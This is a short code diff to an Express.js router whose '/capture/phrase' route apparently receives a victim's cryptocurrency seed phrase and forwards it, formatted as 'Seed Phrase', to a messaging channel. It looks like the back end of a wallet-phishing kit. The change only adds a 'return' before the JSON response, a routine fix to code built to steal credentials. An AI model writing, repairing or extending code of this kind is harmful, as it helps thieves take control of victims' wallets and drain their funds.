@@ -21,7 +21,8 @@ router.post("/capture/phrase", async (req, res) => {
     `<b>Seed Phrase:</b>\n<code>${phrase}</code>`
   );
 
-  res.json({ ok: true });
+  // ADDED 'return' HERE
+  return res.json({ ok: true });
 });
 
 export default router;
